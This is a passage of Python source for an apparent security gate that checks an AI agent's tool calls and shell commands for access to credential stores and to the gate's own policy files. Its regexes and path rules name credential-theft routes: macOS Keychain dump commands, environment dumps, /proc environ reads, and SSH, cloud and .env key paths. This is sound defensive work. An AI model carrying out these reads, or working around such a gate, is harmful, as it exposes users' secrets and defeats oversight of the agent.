    """The credential files a run folder can hold: the core's, and the principal key of each agent that may serve
    there, run/agent-<seat>.principal.key (`default`, $EXO_SEAT and up to 64 seats under $EXO_HOME/seats, named
    as internal_names does: filtered, then sorted, then capped, so other files there take no place; the scan reads
    at most 4,096 entries, once per classify call: every glob word and the cd check share it, #269)."""
    memo = _call_memo.get()
    if memo is not None and "run_secrets" in memo:
        return memo["run_secrets"]
    names = ["default", os.environ.get("EXO_SEAT") or ""]
    try:
        with os.scandir(os.path.join(_exo_home(), "seats")) as it:   # bounded: outside classify, once per glob word
            seats = {e.name if e.is_dir() else os.path.splitext(e.name)[0] for e in itertools.islice(it, 4096)
                     if not e.name.startswith((".", "_")) and (e.is_dir() or e.name.endswith((".toml", ".json")))}
            names += sorted(seats)[:64]
    except OSError:
        pass
    out = ["exod.principal.key", "exod.token"] + [f"agent-{n}.principal.key" for n in dict.fromkeys(names) if n]
    if memo is not None:
        memo["run_secrets"] = out
    return out


_BRACE_CAP = 1024
_BRACE_BUDGET = 4096   # words one classify call may expand in all (see _brace_cost), once for the secret-store checks
                       # and once for the Exo-store checks (#224)
_BRACE_SEQ = re.compile(r"([-+]?\d+)\.\.([-+]?\d+)(?:\.\.([-+]?\d+))?|([A-Za-z])\.\.([A-Za-z])(?:\.\.([-+]?\d+))?")
_brace_left: contextvars.ContextVar[list[int] | None] = contextvars.ContextVar("exo_gate_brace_left", default=None)
_call_memo: contextvars.ContextVar[dict | None] = contextvars.ContextVar("exo_gate_call_memo", default=None)
_F = TypeVar("_F", bound=Callable[..., Any])


class _BraceLimit(Exception):
    pass


def _brace_cost(word: str) -> int:
    """What one expanded word takes from the budget: one, once more per 64 characters, four times for a glob."""
    return (1 + len(word) // 64) * (4 if re.search(r"[*?\[]", word) else 1)


def _brace_budget(fn: _F) -> _F:
    """Give ``fn`` one _BRACE_BUDGET shared by every word it brace-expands, nested calls included, and one memo
    (_call_memo) for what a call reads from disk once (_run_secrets)."""
    @functools.wraps(fn)
    def run(*a: Any, **kw: Any) -> Any:
        if _brace_left.get() is not None:
            return fn(*a, **kw)
        token, memo = _brace_left.set([_BRACE_BUDGET, _BRACE_BUDGET]), _call_memo.set({})
        try:
            return fn(*a, **kw)
        finally:
            _brace_left.reset(token)
            _call_memo.reset(memo)
    return cast(_F, run)


@dataclass
class _Scope:
    """What the secret-store checks of one classify call share: the folders the tool may read from (#209), the gate's
    own folder, the dynamic stores' forms and _real's lookups. The call reads the file system as one snapshot."""
    cwds: tuple[str, ...] = ()
    here: str | None = None                      # the gate's own folder; "" when it cannot be read
    roots: set[str] | None = None
    real: dict[str, str] = field(default_factory=dict)


_scope: contextvars.ContextVar[_Scope | None] = contextvars.ContextVar("exo_gate_scope", default=None)


def _runs_shell(tool: str, args: Mapping) -> bool:
    """A call classify reads as a shell command line. Only these run in their own `cwd` argument; the file tools
    take unknown arguments and still read from the session's folder."""
    return tool in ("terminal", "shell", "bash", "run_command", "exec_command") or (
        tool not in TOOLS and isinstance(args.get("command"), str) and tool.endswith(("terminal", "shell")))


def _in_tool_folder(fn: _F) -> _F:
    """Run ``fn(action, cwd)`` in one _Scope that holds the folders the tool may read from (#209): ``cwd``, the
    session's working folder as the core passes it, always; and for a shell tool, that folder joined with the
    call's own `cwd` argument. A relative path is resolved from each of them and from the gate's own folder."""
    @functools.wraps(fn)
    def run(action: Any, cwd: str | None = None) -> Any:
        folders: list[str] = []
        try:
            tool, args = _args_of(action)
            base = os.path.expanduser(cwd) if isinstance(cwd, str) and cwd else ""
            if base:
                folders.append(os.path.abspath(base))
            sub = args.get("cwd")
            if isinstance(sub, str) and sub and _runs_shell(tool, args):
                folders.append(os.path.abspath(os.path.join(base, os.path.expanduser(sub))))
        except (TypeError, ValueError, OSError):   # an odd action: classify reports it itself
            pass
        token = _scope.set(_Scope(cwds=tuple(dict.fromkeys(folders))))
        try:
            return fn(action, cwd)
        finally:
            _scope.reset(token)
    return cast(_F, run)


def _brace_seq(s: str) -> list[str] | None:
    """The members of a {x..y[..n]} sequence (``s`` is the text inside the braces), or None."""
    m = _BRACE_SEQ.fullmatch(s)
    if not m:
        return None
    if any(len(t) > 18 for t in m.group(1, 2, 3, 6) if t):
        raise _BraceLimit
    x, y = (int(m[1]), int(m[2])) if m[1] else (ord(m[4]), ord(m[5]))
    step = abs(int(m[3] or m[6] or 1)) or 1
    if abs(y - x) // step >= _BRACE_CAP:
        raise _BraceLimit
    vals = range(x, y + 1, step) if x <= y else range(x, y - 1, -step)
    if not m[1]:
        return [chr(v) for v in vals]
    # a leading zero on either bound pads every member to the longer bound, as bash does: {007..1000..993}
    width = max(len(m[1]), len(m[2])) if any(re.match(r"-?0\d", t) for t in m.group(1, 2)) else 0
    if width and not -2**31 <= min(x, y) <= max(x, y) < 2**31:
        raise _BraceLimit    # bash prints a padded member as a C int, so it wraps past int32
    return [f"{v:0{width}d}" for v in vals]


def _brace_words(tok: str, pool: int = 0) -> list[str] | None:
    """``tok`` and the words bash brace expansion makes of it, read as bash's brace_gobbler does: a group
    ends at the first top-level `}` after a comma or `..`; quoted or escaped braces, ${...} and $(...) do
    not expand; a group without a comma is a {x..y[..n]} sequence or literal. None past _BRACE_CAP words (fewer
    for a long word: a million characters in all), past what is left of the call's _BRACE_BUDGET, or past 32
    levels of nesting: callers count that as a hit. ``pool`` 1 charges the Exo-store checks' budget."""
    if "{" not in tok:
        return [tok]
    left = _brace_left.get()
    cap = max(1, min(_BRACE_CAP, (1 << 20) // len(tok), _BRACE_CAP if left is None else left[pool] // _brace_cost(tok)))
    ev: list[tuple[int, str]] = []   # unquoted { } , and `..`; `$` is the brace of ${
    i, quoted = 0, ""
    while i < len(tok):
        c = tok[i]
        if c == "\\" and quoted != "'":
            i += 1
        elif c == "$" and tok.startswith("{", i + 1) and quoted != "'":
            if not quoted:
                ev.append((i + 1, "$"))
            i += 1
        elif quoted:
            quoted = "" if c == quoted else quoted
        elif c in "'\"`":
            quoted = c
        elif c in "$<>" and tok.startswith("(", i + 1):
            depth, i = 0, i + 1
            while i < len(tok):
                if tok[i] == "\\":
                    i += 1
                elif tok[i] in "'\"":
                    j = tok.find(tok[i], i + 1)
                    i = len(tok) if j < 0 else j
                else:
                    depth += {"(": 1, ")": -1}.get(tok[i], 0)
                    if not depth:
                        break
                i += 1
        elif c in "{},":
            ev.append((i, c))
        elif c == "." and tok.startswith(".", i + 1) and not tok.startswith("}", i + 2):
            ev.append((i, "."))
        i += 1
    # Where each { closes: a group's level is the brace depth since it opened, never below zero; it closes
    # at a `}` met at level 0 once a comma or `..` was met at level 0. Groups at level 0 share a bucket.
    match: dict[int, int] = {}
    buckets: list[list] = []          # [depth, still open with no comma yet, will close at the next `}`]
    depth = 0
    for q, k in ev:
        top = buckets[-1] if buckets and buckets[-1][0] == depth else None
        if k in "{$":
            depth += 1
            if k == "{":
                buckets.append([depth, [q], []])
        elif k in ",.":
            if top:
                top[2] += top[1]
                top[1] = []
        else:
            depth -= 1
            if top:
                match.update((f, q) for f in top[2])
                top[0], top[2] = depth, []
                if not top[1]:
                    buckets.pop()
                elif len(buckets) > 1 and buckets[-2][0] == depth:
                    lo = buckets[-2]
                    big, small = (lo[1], top[1]) if len(lo[1]) >= len(top[1]) else (top[1], lo[1])
                    big += small
                    lo[1] = big
                    buckets.pop()
    pos = [q for q, _ in ev]

    def expand(a: int, b: int, level: int) -> list[str]:     # the words of tok[a:b]
        if level > 32:
            raise _BraceLimit
        out, cur = [""], a
        while True:
            n, k, p = 0, bisect.bisect_left(pos, cur), -1
            while k < len(ev) and ev[k][0] < b:
                q, kind = ev[k]
                k += 1
                if kind == "{" and not n:
                    lone = (q == cur or tok[q - 1] in " \t\n") and (q + 1 >= b or tok[q + 1] in " \t\n}")
                    if not lone and match.get(q, b) < b:
                        p = q
                        break
                elif kind in "{$":
                    n += 1
                elif kind == "}" and n:
                    n -= 1
            if p < 0:
                return [o + tok[cur:b] for o in out]
            m = match[p]
            if "," in re.sub(r"\\.", "", tok[p + 1:m], flags=re.S):
                alts, start, n = [], p + 1, 0
                for q, kind in ev[k:bisect.bisect_left(pos, m)] + [(m, ",")]:
                    if kind in "{$":
                        n += 1
                    elif kind == "}" and n:
                        n -= 1
                    elif kind == "," and not n:
                        alts += expand(start, q, level + 1)
                        start = q + 1
                        if len(alts) > cap:
                            raise _BraceLimit
            else:
                alts = _brace_seq(tok[p + 1:m]) or [tok[p:m + 1]]
            if len(out) * len(alts) > cap:
                raise _BraceLimit
            out = [o + tok[cur:p] + x for o in out for x in alts]
            cur = m + 1

    try:
        words = expand(0, len(tok), 0)
    except _BraceLimit:
        return None
    if left is not None and len(words) > 1:
        left[pool] -= sum(map(_brace_cost, words))
    return list(dict.fromkeys([tok] + words))


def _expand_words(words: list[str]) -> list[str]:
    """_expand_text of each word, in one pass when no word holds a newline. A word with a `${VAR:-word}` form of a
    store variable is also read with VAR unset, so both its value and its default count (#202)."""
    if not any("~" in w or "$" in w for w in words):
        return words
    out = [] if any("\n" in w for w in words) else _expand_text("\n".join(words)).split("\n")
    out = out if len(out) == len(words) else [_expand_text(w) for w in words]
    unset = [_expand_text(w, unset=True) for w in words if _STORE_VAR.search(w)]
    return out + [w for w in dict.fromkeys(unset) if w not in out] if unset else out


def _real(path: str, memo: dict[str, str]) -> str:
    """os.path.realpath of a normalized absolute path; ``memo`` shares the parent folders' lookups."""
    if path not in memo:
        d, base = os.path.split(path)
        if base and d.count("/") >= 64 and d not in memo:
            memo[d] = os.path.realpath(d)      # a deep folder is looked up whole, once
        memo[path] = (path if not base else os.path.realpath(path) if os.path.islink(path)
                      else os.path.join(_real(d, memo), base))
    return memo[path]


def is_sensitive_path(path: str) -> bool:
    """True when ``path`` names one of the secret stores (ssh, cloud and netrc credentials, Exo's key
    stores and run folders, signing keys, token and client-secret files, .env files). Never reads the file. A
    brace set counts when the path or any word bash expands it to names a store, or when it expands past the cap."""
    words = _brace_words(str(path or ""))
    return words is None or _sensitive_words(words)


def _sensitive_words(words: list[str]) -> bool:
    """is_sensitive_path for any of ``words``, which are already brace-expanded. A word is matched as written, and
    as resolved from the gate's own folder and from the tool's (_Scope, #209): its absolute and real forms against
    the dynamic stores, and, when a link led elsewhere, its real form by name too (for a relative word that lands
    below the folder it was read from, only the part below it, so a folder like a repo's `.claude` does not count).
    A form ending in `.pub` is a public key, meant to be shared; a link named `x.pub` is judged by where it leads."""
    words = [w for w in (w.strip() for w in _expand_words(words)) if w]
    if any(_SENSITIVE_PATH.search(w.replace("\\", "/")) for w in words if not w.endswith(".pub")):
        return True
    scope = _scope.get() or _Scope()
    if scope.roots is None:
        scope.roots = {r for root in _dynamic_secret_paths() for r in (os.path.abspath(root), os.path.realpath(root))}
        try:
            scope.here = os.getcwd()
        except OSError:
            scope.here = ""
    roots, memo = scope.roots, scope.real
    for base in dict.fromkeys(("", *scope.cwds)):       # "": the gate's own folder
        for w in words:
            p = os.path.join(base, w)                    # an absolute word stays as it is
            try:
                a = os.path.normpath(os.path.join(scope.here, p)) if scope.here else os.path.abspath(p)
                real = os.path.realpath(p) if ".." in p.split(os.sep) or a.startswith("//") else _real(a, memo)
                cands = {a, real}
            except (OSError, ValueError):
                real, cands = "", {p}
            cands = {c for c in cands if not c.endswith(".pub")}
            if any(c == r or c.startswith(r + os.sep) for c in cands for r in roots) or _is_run_dir(p, real):
                return True
            if real in cands and real != a and _SENSITIVE_PATH.search(_below(real, base or scope.here, w, memo)):
                return True
    return False


def _below(real: str, folder: str | None, word: str, memo: dict[str, str]) -> str:
    """A resolved path as _sensitive_words matches it by name: the part below the ``folder`` a relative ``word`` was
    read from, when it lands there; else the whole path."""
    if os.path.isabs(word) or not folder:
        return real
    try:
        top = _real(os.path.normpath(folder), memo).rstrip(os.sep) + os.sep
    except (OSError, ValueError):
        return real
    return real[len(top):] if real.startswith(top) else real


class StoreSkip:
    """For a tool that walks a folder (grep, glob): which entries below ``root`` it leaves out as secret stores
    (#241). An entry is left out when is_sensitive_path matches it as found or as resolved, so a plainly named
    link into ~/.ssh is left out too. When the path the caller ``named`` is itself a store, as spelled, normalised
    and resolved, the gate asked about it, so what sits below it is read, except a link out of it into another
    store. The root is never left out.
    In a repo's own `.claude` folder (its parent holds `.git`; not HOME's, not CLAUDE_CONFIG_DIR, and no Claude login,
    transcripts or shell snapshots in it) the worktrees, commands, agents and skills subfolders are searched, so a
    worktree checkout under `.claude/worktrees` is too; the rest of it (settings.local.json) stays out.
    Call it on each folder and file as the walk finds it; ``skipped`` counts what it left out. Folders below the
    root are not links (the walk does not follow them), so the file system cost is one lstat per entry, plus a few
    cached existence checks per `.claude` folder."""

    _ODD = re.compile(r"[{}$~\\]|\s$")   # spellings is_sensitive_path expands or trims: ask it directly
    _NO_CLAUDE = re.compile(_SENSITIVE_PATH.pattern.replace(r"\.claude(/[^/]*)*|", ""))
    _CLAUDE_OK = ("worktrees", "commands", "agents", "skills")   # what a repo's .claude holds besides settings
    _CLAUDE_CONF = (".credentials.json", "projects", "shell-snapshots", "history.jsonl")   # a Claude config folder

    def __init__(self, root: str, named: str = "") -> None:
        self.root, self.abs, self.real = root, os.path.abspath(root), os.path.realpath(root)
        # A named store counts only when the folder walked is one: `~/.ssh/..` or a link `x.key` to HOME is not.
        self.whole = bool(named) and all(map(is_sensitive_path, (named, self.abs, self.real)))
        self.roots = {r for x in _dynamic_secret_paths() for r in (os.path.abspath(x), os.path.realpath(x))}
        self.below = tuple(r + os.sep for r in self.roots)
        self.skipped = 0
        self._repo = {os.path.abspath(_home()): False, os.path.realpath(_home()): False}   # folder -> holds .git

    def _hit(self, path: str) -> bool:
        p = path.replace("\\", "/")
        m = _SENSITIVE_PATH.search(p)
        if m and m.group(2).startswith(".claude") and self._project_claude(p):
            m = self._NO_CLAUDE.search(p)
        return not path.endswith(".pub") and (   # public keys are meant to be shared, as in is_sensitive_path
            bool(m) or path in self.roots or path.startswith(self.below))

    def _project_claude(self, p: str) -> bool:
        """Every `.claude` in ``p`` is a repo's, and ``p`` is that folder or in one of its _CLAUDE_OK subfolders."""
        parts = p.split("/")
        for i in (i for i, x in enumerate(parts) if x == ".claude"):
            top = "/".join(parts[:i]) or "/"
            if top not in self._repo:   # another home that is a git checkout still holds a config folder: not a repo's
                d = os.path.join(top, ".claude")
                self._repo[top] = os.path.lexists(os.path.join(top, ".git")) and not any(
                    os.path.lexists(os.path.join(d, x)) for x in self._CLAUDE_CONF)
            if not self._repo[top] or (parts[i + 1] not in self._CLAUDE_OK if i + 1 < len(parts)
                                       else not os.path.isdir(p)):   # a file called .claude stays out
                return False
        return True

    def __call__(self, path: str) -> bool:
        # rel never starts with a separator, so a root whose real path is `/` gives `/srv/x`, not `//srv/x`.
        rel, link = path[len(self.root):].lstrip(os.sep), os.path.islink(path)
        full, real = os.path.join(self.abs, rel), os.path.realpath(path) if link else os.path.join(self.real, rel)
        if self.whole:
            hit = link and not real.startswith(self.real.rstrip(os.sep) + os.sep) and self._hit(real)
        else:
            hit = (self._hit(full) or (real != full and self._hit(real))
                   or bool(self._ODD.search(rel)) and is_sensitive_path(full))
        self.skipped += hit
        return hit

    def note(self) -> str:
        """The line a tool appends when it left anything out, so a search is never silently incomplete."""
        return f"[skipped {self.skipped} secret-store paths; read one by name to be asked]" if self.skipped else ""


def holds_secret_store(folder: str) -> bool:
    """True when ``folder`` is a secret store or holds a known one (the home folder, EXO_HOME, ``~/.config``...).
    For a tool that hands a whole folder to another program, which cannot leave stores out as StoreSkip does."""
    home = _home()
    stores = [os.path.join(home, s) for s in _SENSITIVE_SAMPLES] + [_exo_home(), *_dynamic_secret_paths()]
    forms = _path_forms(os.path.abspath(folder))
    return is_sensitive_path(folder) or any(s == f or s.startswith(f.rstrip("/") + "/")
                                            for f in forms for x in stores for s in _path_forms(x))


def _glob_hits_secret(tok: str) -> bool:
    """A shell glob that could expand to a secret store. Bare `*` or `*.json` do not count; the last
    component needs three literal characters, or the directory must itself be a secret store. Brace sets
    are expanded first, as bash does; a hit on the word or on any word it expands to counts."""
    words = _brace_words(tok)
    return words is None or _glob_words(words)


def _glob_words(words: list[str]) -> bool:
    """_glob_hits_secret for any of ``words``, which are already brace-expanded."""
    words = [w for w in _expand_words(words) if re.search(r"[*?\[]", w)]
    if not words:
        return False
    home = _home()
    samples = [os.path.join(home, x) for x in _SENSITIVE_SAMPLES] + [os.path.join(_exo_home(), "keys", "seat.key"),
                                                                       _dynamic_secret_paths()[1]]
    secrets = _run_secrets()
    runs = [os.path.join(_exo_home(), "run"), os.path.join(home, ".exo", "run"), ".exo/run"]
    return any(_glob_word(w, home, samples, secrets, runs) for w in words)


_PROC_FILE = re.compile(r"/proc/[^/]+/(?:([^/]+)/[^/]+/)?([^/]+)")


def _glob_word(tok: str, home: str, samples: list[str], secrets: list[str], runs: list[str]) -> bool:
    raw = tok.rpartition("/")[0]                         # its folder as written: a link resolves before its `..`
    tok = os.path.normpath(tok)                          # run/./*, run//* and run/jobs/../* are run/*
    proc = _PROC_FILE.fullmatch(tok)                     # /proc/<pid>/environ, or a thread's (#199, #313)
    if proc and (proc[1] is None or _glob_names(proc[1], ("task",))) and _glob_names(proc[2], ("environ",)):
        return True
    d, _, base = tok.rpartition("/")
    stem = re.sub(r"[*?\[\]]", "", base.rsplit(".", 1)[0] if "." in base[1:] else base)
    d_abs = os.path.normpath(d if d.startswith("/") else os.path.join(home, d)) if d and not re.search(r"[*?\[]", d) else ""
    linked = bool(d_abs) and _is_run_dir(raw if raw.startswith("/") else os.path.join(home, raw))
    if linked:                                           # also when normpath lost it: ~/<link to run/jobs>/..
        runs = runs + [d_abs]
    keys = "agent-" in tok or ".principal" in tok
    if "/" in tok:   # an agent key only when the glob spells its key part, names a run folder, or has a literal
        # folder part around its wildcards (`~/.exo/*/`); not for `*/*default*` or `~/*test*`, which bash cannot
        # expand into a run folder but fnmatch's `*` would match across `/`
        reach = keys or linked or (d_abs in [os.path.normpath(os.path.join(home, r)) for r in runs] if d_abs else any(
            q and not re.fullmatch(r"[*?]+|\.{1,2}", q) for q in d.split("/")))
        samples = samples + [os.path.join(r, x) for r in runs for x in secrets if reach or x.startswith("exod.")]
    in_store_dir = linked or bool(d_abs) and d_abs != home and any(x.startswith(d_abs + "/") for x in samples)
    if len(stem) < 3 and not in_store_dir:
        return False
    if "/" not in tok:   # a bare name: a run secret by its own name, an agent key only by its `agent-` or key part
        if any(_glob_rx(tok).match(x) for x in secrets if keys or x.startswith("exod.")):
            return True
    head, tail = re.split(r"[*?\[]", tok, maxsplit=1)[0], re.split(r"[*?\[\]]", tok)[-1]   # literal: narrow first
    xs = [x for x in samples + list(_SENSITIVE_SAMPLES)
          if x.endswith(tail) and (x.startswith(head) if tok.startswith("/") else head in x)]
    if not xs:
        return False
    rx = _glob_rx(tok)
    return any(rx.match(x) for x in xs)


@functools.lru_cache(maxsize=4096)
def _glob_rx(tok: str) -> re.Pattern[str]:
    """The bash glob ``tok`` as a pattern, also matching after any `/` when ``tok`` is relative. Read as bash reads it
    (_fn_glob: `[^x]` is `[!x]`, a POSIX class is spelt out, #199); one that could match anything matches everything."""
    pat = _fn_glob(tok)
    return re.compile(("" if tok.startswith("/") else r"(?s:.*/)?") + (r"(?s:.*)\Z" if pat is None else fnmatch.translate(pat)))


# D-038: the Exo store is credentials. Its policies, state (approval grants), ledger, keys, seat files,
# the core sockets and the bus folder (the seat registry signed answers trust and the relay database, #210)
# steer the gate itself, so a write to them always asks the principal. Names that are distinctive match
# anywhere (a relative `policies/gates.yaml` may sit in the tool's working folder); absolute paths are also
# checked against EXO_HOME, its principal stores, EXO_PRINCIPAL_STORE, every store root recorded in config
# `principals` (`exo init --root`, `exo import-store --root`) and the bus folder and files (_bus_paths).
# $EXO_HOME/update holds the signed-update trust pin, which decides what `exo update` installs (D-073, #133).
_STORE_NAMES = re.compile(
    r"(^|/)(\.exo/(principals/[^/]+/)?(policies|state|keys|run|seats)(/|$)|\.exo/(principals/[^/]+/)?ledger\.sqlite|"
    r"\.exo/bus(/|$)|bus/registry\.json$|bus/relay\.sqlite(-wal|-shm|-journal)?$|"
    r"\.exo/update(/|$)|update/allowed_signers$|"
    r"policies/(gates|budget|interruptions|approvals|posting|brief|consolidate)\.(ya?ml|md)$|"
    r"policies/internal-names\.txt$|state/(approval|gate)-grants\.json$|"
    r"(ledger|schedule)\.sqlite(-wal|-shm|-journal)?$|"
    r"seat\.(toml|json)$|(exod|agent-[^/]*)\.sock$)")
_HOME_PROTECTED = ("policies", "state", "keys", "run", "seats", "update")
_STORE_PROTECTED = ("policies", "state", "keys")
# #210: $EXO_HOME/bus, and the bus settings that move a file the gate trusts out of it: the registry, the relay
# database and its sidecars, and the seat keys folder. Each name is read as EXO_BUS_<NAME> and as the legacy
# DIVAN_<NAME>, both when both are set (exo.bus.config takes the first; approvals.seat_pubkeys reads EXO_BUS_REGISTRY
# alone).
_BUS_FILES = (("REGISTRY", ("",)), ("DB", ("", "-wal", "-shm", "-journal")), ("KEYS_DIR", ("",)))
# #217: a descriptor or process folder names whatever the writing process holds there (`/dev/fd/3` after
# `exec 3< f`, `/proc/self/cwd`), which the gate cannot resolve from its own process, so a write through one is
# a store write. It matches anywhere in a path as written, so a relative `dev/fd/3` after `cd /` counts; a
# resolved spelling is not tested (the gate's own realpath of /dev/stdout runs through its own descriptors). The
# writer's stdout and stderr (`/dev/fd/1`, `/proc/self/fd/2`) are left out: a store file opened on them is caught
# where it is opened (_store_touch).
_FD_PATH = re.compile(r"(^|/)(dev/(fd|stdin)|proc/(self|thread-self|\d+|\$[^/]*)(/task/[^/]+)?/(fd|cwd|root|map_files))(/|$)")
_STD_FD = re.compile(r"(^|/)(dev/fd|proc/(self|thread-self)(/task/[^/]+)?/fd)/0*[12]$")
_FD_DIR = re.compile(r"/+(dev|proc(/[^/]+(/task(/[^/]+)?)?)?)")      # cd here, then `> fd/3` or `> self/fd/3`


def _store_roots() -> list[tuple[str, tuple, bool]]:
    """(root, protected top-level names, has principals/<name>/ stores below it)."""
    roots: list[tuple[str, tuple, bool]] = [(_exo_home(), _HOME_PROTECTED, True)]
    if os.environ.get("EXO_PRINCIPAL_STORE"):
        roots.append((os.path.expanduser(os.environ["EXO_PRINCIPAL_STORE"]), _STORE_PROTECTED,
                      False))
    from .store import explicit_roots  # stores made with --root (config `principals`): live, outside the home
    return roots + [(os.path.abspath(r), _STORE_PROTECTED, False) for r in explicit_roots(_exo_home()).values()]


def _bus_paths() -> list[tuple[str, tuple]]:
    """(folder, protected names in it): the bus folder in EXO_HOME, and each bus file the environment sets."""
    out: list[tuple[str, tuple]] = [(_exo_home(), ("bus",))]
    for name, ends in _BUS_FILES:
        for value in filter(None, (os.environ.get(f"EXO_BUS_{name}"), os.environ.get(f"DIVAN_{name}"))):
            folder, base = os.path.split(os.path.abspath(os.path.expanduser(value)))
            out.append((folder, tuple(base + e for e in ends)))
    return out


def _fd_path(p: str) -> bool:
    """A descriptor or process-folder path (_FD_PATH), as written or normalised, other than stdout or stderr spelt
    plainly. As written counts too: the kernel resolves `/dev/fd/3/../..` from descriptor 3's folder."""
    return bool(p) and any(_FD_PATH.search(f) for f in (p, os.path.normpath(p))) and \
        not _STD_FD.search(p.rstrip("/") or p)


def _protected_rel(parts: list[str], names: tuple) -> bool:
    return bool(parts) and (parts[0] in names or parts[0].startswith(("ledger.sqlite", "schedule.sqlite")))


def _path_forms(p: str) -> set[str]:
    """The lexical and the resolved spelling of an absolute path. A path that cannot be resolved (NUL byte,
    symlink loop) keeps its lexical form, so a resolution failure never weakens a check."""
    forms = {re.sub(r"^//", "/", os.path.normpath(p))}  # normpath keeps a leading `//`
    try:
        forms.add(os.path.realpath(p))
    except (OSError, ValueError, RecursionError):
        pass
    return forms


def is_store_path(path: str, ancestors: bool = False) -> bool:
    """True when ``path`` is (or, with ``ancestors``, contains) a protected part of the Exo store. A brace set
    counts when the path or any word bash expands it to is in the store, or when it expands past the cap (#224)."""
    words = _brace_words(str(path or ""), pool=1)
    return words is None or any(_store_word(w, ancestors) for w in words)


def _store_word(path: str, ancestors: bool = False) -> bool:
    """is_store_path for one word whose braces are already expanded."""
    p = _expand_text(path).strip().replace("\\", "/")
    if not p:
        return False
    if _STORE_NAMES.search(p) or _fd_path(p) or ancestors and _FD_DIR.fullmatch(os.path.normpath(p)):
        return True                      # with ancestors: `ln -s /dev x` makes x/fd/3 a descriptor path
    if not p.startswith("/"):
        return False                     # relative: names only; the tool's working folder is not known here
    # Resolve the original spelling: normpath first would erase symlink/.. traversal.
    # Keep the lexical candidate too, including protected paths that link out of the store.
    candidates = _path_forms(p)
    if any(_STORE_NAMES.search(c) for c in candidates):
        return True
    roots = [(r, names, principals) for root, names, principals in _store_roots() for r in _path_forms(root)]
    roots += [(r, names, False) for root, names in _bus_paths() for r in _path_forms(root)]
    for candidate in candidates:
        for r, names, principals in roots:
            if ancestors and (r == candidate or r.startswith(candidate.rstrip("/") + "/")):
                return True
            if not candidate.startswith(r.rstrip("/") + "/"):
                continue
            parts = candidate[len(r.rstrip("/")) + 1:].split("/")
            if _protected_rel(parts, names):
                return True
            if principals and parts[0] == "principals":
                if len(parts) <= 2 and ancestors:
                    return True
                if _protected_rel(parts[2:], _STORE_PROTECTED):
                    return True
    return False


def _in_store_dir(path: str) -> bool:
    """A `cd` target inside EXO_HOME or the principal store: relative names after it may be the store. So is a
    descriptor or process folder, or a folder above one (`/dev`, `/proc/self`), where `> fd/3` is one (#217)."""
    p = _expand_text(path).strip()
    if _fd_path(p) or _FD_DIR.fullmatch(os.path.normpath(p or ".")):
        return True
    if not p.startswith("/"):
        return bool(re.search(r"(^|/)\.exo(/|$)", p))
    roots = [r for root, _, _ in _store_roots() for r in _path_forms(root)]
    return any(c == r or c.startswith(r.rstrip("/") + "/") for c in _path_forms(p) for r in roots)


_PATCH_PATHS = re.compile(r"^\*\*\*\s*(?:Update|Add|Delete)\s+File:\s*(.+?)\s*$|^\*\*\*\s*Move\s+File:\s*(.+?)\s*->\s*(.+?)\s*$",
                          re.M)


def _patch_paths(text: str) -> list[str]:
    return [p for m in _PATCH_PATHS.finditer(text or "") for p in m.groups() if p]


_PATH_ARG_KEYS = ("path", "file_path", "file", "filename", "paths", "files", "directory", "dir", "root", "source",
                  "src", "dest", "destination")


@_brace_budget
def args_sensitive(args: Mapping) -> str:
    """The first path-like tool argument that names a secret store, or ''."""
    for k in _PATH_ARG_KEYS:
        v = args.get(k)
        for item in (v if isinstance(v, (list, tuple)) else [v]):
            if isinstance(item, str) and item:
                words = _brace_words(item)         # expanded once for both checks
                if words is None or _sensitive_words(words) or _glob_words(words):
                    return item
    return ""


_KEYCHAIN = re.compile(r"\bsecurity\s+(?:-\S+\s+)*(find-generic-password|find-internet-password|"
                       r"find-key|dump-keychain|export|unlock-keychain|show-keychain-info|import)\b")
_PROVIDER_ROUTE = re.compile(r"/api/providers\b|\bproviders_setup\b")  # D-034 key routes and module
_SECRET_VAR = re.compile(r"\$\{?[A-Za-z0-9_]*(API_KEY|_KEY|_TOKEN|_SECRET|_PASSWORD|_PASSWD)\b")
_PIECE_SPLIT = re.compile(r"[\s'\"<>;|&()`,]+")


def _env_dump(argv: list[str]) -> bool:
    """env/printenv/set/export/declare printing the environment (or a secret-looking variable)."""
    if not argv:
        return False
    prog, rest = argv[0].rsplit("/", 1)[-1], argv[1:]
    if prog == "env":
        rest = [a for a in rest if not _ASSIGN.fullmatch(a)]
        return not [a for a in rest if not a.startswith("-")]
    if prog == "printenv":
        return not rest or any(re.search(r"KEY|TOKEN|SECRET|PASS", a, re.I) for a in rest)
    if prog in ("set", "typeset", "declare", "export", "compgen", "readonly"):
        flags = [a for a in rest if a.startswith("-")]
        names = [a for a in rest if not a.startswith("-")]
        if prog == "compgen":
            return "-e" in flags or "-v" in flags
        if prog == "set":
            return not rest
        return not names and (not flags or any(f in ("-p", "-x", "-px", "-xp") for f in flags))
    return False


def _shell_credential_hit(cmd: str, segs: list[list[str]], raws: list[str] | None = None) -> str:
    """What in a shell command touches a secret store: a path (also through ~, $HOME, a glob, a brace set
    in the source text ``raws`` of a word or redirection target, or a quoted `bash -c` string), the Keychain,
    or a bare environment dump. '' if nothing."""
    text = _expand_text(cmd)
    if _KEYCHAIN.search(text):
        return "keychain access"
    if _PROVIDER_ROUTE.search(text):
        return "provider key route"
    if _SECRET_VAR.search(text):
        return "secret environment variable"
    pieces = [p for p in _PIECE_SPLIT.split(text) if p]
    for seg in segs:
        pieces += [re.sub(r"^(\d*>>?|&>>?|<|[\w-]+=)", "", t) for t in seg]
        flat, _ = _strip_prefixes_keep_env(seg)
        if _env_dump(flat):
            return "environment dump"
        if flat and flat[0].rsplit("/", 1)[-1] == "security" and any(
                a in ("-w", "-g", "-gs", "-wg") for a in flat[1:]) and len(flat) > 1 and flat[1].startswith("find"):
            return "keychain access"
    for p in pieces:
        p = re.sub(r"^[\w-]+=", "", p) if "=" in p and not p.startswith("=") else p
        if p and (_sensitive_words([p]) or _glob_words([p])):
            return p
    groups: dict[str, list[str]] = {}         # bash expands only unquoted braces: expand, then dequote
    for raw in dict.fromkeys(raws or []):
        words = _brace_words(raw.replace("\\\n", ""))   # after line continuations are gone
        if words is None:
            return raw
        alts = words[1:] or words
        found = [d for w in alts for d in _dequote(w)] if len(words) > 1 or '$"' in raw else []
        found += [d for w in alts for f in _unknown_forms(w) for d in _dequote(f)]   # what an expansion may print
        if found:
            groups[raw] = [re.sub(r"^(\d*>>?|&>>?|<|[\w-]+=)+", "", d) for d in found]
    words = [w for ws in groups.values() for w in ws]
    if words and (_sensitive_words(words) or _glob_words(words)):
        return next((raw for raw, ws in groups.items() if _sensitive_words(ws) or _glob_words(ws)), "brace set")
    return ""


